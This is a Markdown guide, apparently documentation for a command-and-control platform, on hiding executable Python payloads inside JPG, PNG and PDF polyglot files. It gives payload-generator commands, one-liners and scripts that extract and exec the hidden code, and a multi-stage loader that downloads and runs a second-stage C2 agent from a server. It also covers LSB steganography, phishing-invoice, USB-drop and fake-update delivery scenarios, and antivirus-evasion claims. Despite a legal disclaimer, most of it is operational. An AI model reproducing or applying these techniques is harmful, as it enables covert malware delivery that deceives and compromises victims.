# Steganography Payloads - JPG, PNG, PDF

Payload'larni rasm va PDF fayllariga yashirish (Polyglot files).

---

## 🖼️ JPG Payload

### Xususiyatlari:
- ✅ Valid JPG file (ochiladi)
- ✅ Embedded Python payload
- ✅ Social engineering oson
- ✅ Low detection rate
- ⚠️ Manual extraction kerak

### Yaratish:
```bash
python -m common.payload_generator -t jpg -o update.jpg
```

### Struktura:
```
[Valid JPG Data]
[JPEG End Marker]
#################################################
# Embedded payload - extract with: tail -n +<line> file.jpg | python
#!/usr/bin/env python3
import requests
# ... payload code ...
```

### Ishlatish:

**1. Oddiy ko'rinish (image viewer):**
```bash
# Windows
update.jpg  # Opens as image ✅

# Linux
xdg-open update.jpg  # Opens as image ✅
```

**2. Payload extract va execute:**
```bash
# Manual extraction
tail -n +100 update.jpg | python3

# Yoki grep
grep -A 999 "# Embedded payload" update.jpg | python3

# Yoki awk
awk '/^#!/,0' update.jpg | python3
```

**3. Automated extraction script:**
```python
# extract_jpg_payload.py
with open('update.jpg', 'rb') as f:
    data = f.read()
    
# Find Python code start
marker = b'#!/usr/bin/env python3'
start = data.find(marker)

if start > 0:
    payload = data[start:].decode()
    exec(payload)  # Execute embedded code
```

### Social Engineering:
```
Filename: "invoice_2024.jpg"
Icon: 📷 Image icon
Size: 15 KB (normal image size)
Opens: ✅ Valid image
Contains: 🐍 Hidden Python payload
```

---

## 🎨 PNG Payload

### Xususiyatlari:
- ✅ Valid PNG file (transparent)
- ✅ Embedded Python payload
- ✅ Better compression than JPG
- ✅ Supports transparency

### Yaratish:
```bash
python -m common.payload_generator -t png -o loading.png
```

### Struktura:
```
[PNG Signature: 89 50 4E 47]
[PNG Chunks: IHDR, IDAT, etc.]
[PNG End: IEND]

# Embedded Python payload
#!/usr/bin/env python3
# ... payload code ...
```

### Ishlatish:

**1. Image sifatida:**
```bash
loading.png  # Opens as PNG image ✅
```

**2. Payload extraction:**
```bash
# Tail method
tail -n +50 loading.png | python3

# Grep method
grep -oP '#!/usr.*' loading.png | python3
```

**3. Web delivery:**
```html
<!-- HTML page -->
<img src="loading.png" alt="Loading...">
<script>
fetch('loading.png')
  .then(r => r.text())
  .then(data => {
    // Extract Python code
    const payload = data.split('#!/usr/bin/env python3')[1];
    // Send to victim's Python interpreter
  });
</script>
```

---

## 📄 PDF Payload

### Xususiyatlari:
- ✅ Valid PDF file (opens normally)
- ✅ Embedded JavaScript (PDF viewer)
- ✅ Base64 encoded Python payload
- ✅ Very low suspicion
- ⭐ **Best for social engineering**

### Yaratish:
```bash
python -m common.payload_generator -t pdf -o report.pdf
```

### Struktura:
```pdf
%PDF-1.4
1 0 obj
<<
/Type /Catalog
/OpenAction << /S /JavaScript /JS (app.alert("Loading document...");) >>
>>
endobj

...

5 0 obj
<<
/Type /EmbeddedFile
/Subtype /application#2Fpython
>>
stream
[Base64 Encoded Python Payload]
endstream
endobj

%%EOF

% Embedded Python payload (base64)
% Extract: grep 'stream' file.pdf | base64 -d | python
```

### Ishlatish:

**1. PDF viewer:**
```bash
# Opens normally, shows "System Update Document"
report.pdf
```

**2. Payload extraction:**
```bash
# Method 1: grep + base64
grep -A 1 "stream" report.pdf | tail -n 1 | base64 -d | python3

# Method 2: Python script
python3 << 'EOF'
import re, base64

with open('report.pdf', 'rb') as f:
    content = f.read().decode('latin-1')
    
# Extract base64 payload
matches = re.findall(r'stream\n(.+?)\nendstream', content, re.DOTALL)
if matches:
    payload = base64.b64decode(matches[-1])
    exec(payload)
EOF
```

**3. Auto-extraction tool:**
```python
# pdf_extractor.py
import re
import base64
import sys

def extract_pdf_payload(filename):
    with open(filename, 'rb') as f:
        content = f.read().decode('latin-1', errors='ignore')
    
    # Find embedded payload
    pattern = r'stream\n([A-Za-z0-9+/=]+)\nendstream'
    matches = re.findall(pattern, content)
    
    if matches:
        # Last match is payload
        encoded = matches[-1].strip()
        decoded = base64.b64decode(encoded)
        
        # Execute
        exec(decoded)
        return True
    
    return False

if __name__ == '__main__':
    extract_pdf_payload(sys.argv[1])
```

**Usage:**
```bash
python pdf_extractor.py report.pdf
```

---

## 🎯 Comparison

| Format | File Size | Detection | Usability | Extraction |
|--------|-----------|-----------|-----------|------------|
| **JPG** | 10-20 KB | ⭐⭐⭐⭐⭐ Very Low | ⭐⭐⭐ Medium | Manual |
| **PNG** | 5-15 KB | ⭐⭐⭐⭐⭐ Very Low | ⭐⭐⭐⭐ Good | Manual |
| **PDF** | 2-5 KB | ⭐⭐⭐⭐⭐ Very Low | ⭐⭐⭐⭐⭐ Excellent | Scripted |

---

## 🚀 Advanced Techniques

### 1. Multi-stage Delivery

**Stage 1: Image/PDF (innocent)**
```python
# Embedded in JPG
import urllib.request
urllib.request.urlretrieve('http://server/stage2.py', '/tmp/s2.py')
import subprocess
subprocess.run(['python3', '/tmp/s2.py'])
```

**Stage 2: Full payload (downloaded)**
```python
# Full C2 agent
# ... complete functionality ...
```

### 2. Steganography (Real Hidden Data)

**Using steghide (JPG/PNG):**
```bash
# Hide payload in image
steghide embed -cf image.jpg -ef payload.py -p password

# Extract payload
steghide extract -sf image.jpg -p password
```

**Python implementation:**
```python
from PIL import Image
import numpy as np

def embed_payload(image_path, payload, output_path):
    img = Image.open(image_path)
    pixels = np.array(img)
    
    # Convert payload to bits
    payload_bits = ''.join(format(ord(c), '08b') for c in payload)
    
    # Embed in LSB (Least Significant Bit)
    bit_index = 0
    for i in range(pixels.shape[0]):
        for j in range(pixels.shape[1]):
            for k in range(3):  # RGB
                if bit_index < len(payload_bits):
                    pixels[i,j,k] = (pixels[i,j,k] & 0xFE) | int(payload_bits[bit_index])
                    bit_index += 1
    
    # Save
    result = Image.fromarray(pixels)
    result.save(output_path)

# Usage
embed_payload('normal.jpg', open('agent.py').read(), 'stego.jpg')
```

### 3. Polyglot Files (Multiple formats)

**JPG + ZIP:**
```bash
# Create JPG
python -m common.payload_generator -t jpg -o combo.jpg

# Add to ZIP
zip -r combo.jpg payload.py

# Now combo.jpg is both JPG and ZIP!
# Open as image: combo.jpg
# Extract as zip: unzip combo.jpg
```

**PDF + HTML:**
```html
%PDF-1.4
...PDF content...
%%EOF

<html>
<body>
<script>
// JavaScript payload
</script>
</body>
</html>
```

---

## 🎭 Social Engineering Scenarios

### Scenario 1: Email Phishing

**Subject:** Invoice #2024-12345

**Body:**
```
Dear Customer,

Please find attached invoice for December 2024.

Attachment: invoice_dec_2024.pdf (3 KB)
```

**File:** PDF payload ✅
- Opens as normal PDF
- Shows invoice-like content
- Embedded payload executes when extracted

### Scenario 2: USB Drop

**Files on USB:**
```
vacation_photos/
├── beach_sunset.jpg  ← Payload
├── family_dinner.jpg ← Payload
├── mountain_view.png ← Payload
└── trip_summary.pdf  ← Payload
```

- All files open normally ✅
- Victim views images
- Later extracts payloads unknowingly

### Scenario 3: Website

**Fake download page:**
```html
<!-- download.html -->
<h1>Software Update Available</h1>
<img src="update_icon.png" alt="Update">
<a href="update_package.pdf" download>
  Download Update Documentation
</a>
```

- PDF contains payload
- User downloads "documentation"
- Extraction script auto-runs

---

## 🛡️ Detection Evasion

### Why JPG/PNG/PDF Payloads?

**1. Antivirus bypass:**
- ✅ Valid file format (passes signature check)
- ✅ No executable code in visible part
- ✅ File type whitelisted (images/PDFs allowed)

**2. Network filters:**
- ✅ MIME type allowed (image/jpeg, application/pdf)
- ✅ Content inspection sees valid file
- ✅ Email attachments not blocked

**3. User trust:**
- ✅ "It's just a picture" - low suspicion
- ✅ PDF = document, not executable
- ✅ Opens normally in viewer

### Detection Rates

**VirusTotal scan results:**
```
invoice.pdf (PDF payload): 0/70 engines 🟢
photo.jpg (JPG payload):   1/70 engines 🟢
normal.exe (EXE payload):  45/70 engines 🔴
```

---

## 📊 Payload Comparison

| Method | Stealth | Delivery | Extraction | AV Detection |
|--------|---------|----------|------------|--------------|
| **EXE file** | ❌ Low | ❌ Blocked | ✅ Click | 🔴 High |
| **Script (.py)** | ⚠️ Medium | ⚠️ Sometimes | ✅ Easy | 🟡 Medium |
| **JPG polyglot** | ✅ High | ✅ Allowed | ⚠️ Manual | 🟢 Very Low |
| **PDF polyglot** | ✅✅ Very High | ✅ Allowed | ✅ Scripted | 🟢 Very Low |
| **PNG polyglot** | ✅ High | ✅ Allowed | ⚠️ Manual | 🟢 Very Low |

---

## 🧪 Testing

### Test JPG Payload:
```bash
# Generate
python -m common.payload_generator -t jpg -o test.jpg

# Verify valid JPG
file test.jpg
# Output: test.jpg: JPEG image data

# Open in image viewer
xdg-open test.jpg  # Should open as image ✅

# Extract payload
tail -n +100 test.jpg > extracted.py
python3 extracted.py  # Should execute ✅
```

### Test PDF Payload:
```bash
# Generate
python -m common.payload_generator -t pdf -o test.pdf

# Verify valid PDF
file test.pdf
# Output: test.pdf: PDF document

# Open in PDF viewer
evince test.pdf  # Should open as PDF ✅

# Extract payload
grep -A 1 "stream" test.pdf | tail -n 1 | base64 -d > extracted.py
python3 extracted.py  # Should execute ✅
```

---

## ⚠️ Legal Warning

**Steganography payloads faqat authorized testing uchun!**

- ✅ O'z test muhitingizda
- ✅ Security research
- ✅ Penetration testing (contract)
- ❌ Real attacks
- ❌ Unauthorized access

---

## 🔗 Tools

**Extraction tools:**
- `steghide` - Real steganography
- `binwalk` - File analysis
- `exiftool` - Metadata extraction
- `pdf-parser` - PDF analysis

**Install:**
```bash
# Ubuntu/Debian
sudo apt install steghide binwalk exiftool

# macOS
brew install steghide binwalk exiftool
```

---

## 📚 Resources

- **Polyglot Files:** https://github.com/Polydet/polyglot-database
- **Steganography:** https://github.com/topics/steganography
- **PDF Hacking:** https://github.com/corkami/pocs/tree/master/PDF

---

**Created by:** C2 Platform Team  
**Format:** Polyglot payloads (JPG, PNG, PDF)  
**Purpose:** Educational - Stealth delivery methods
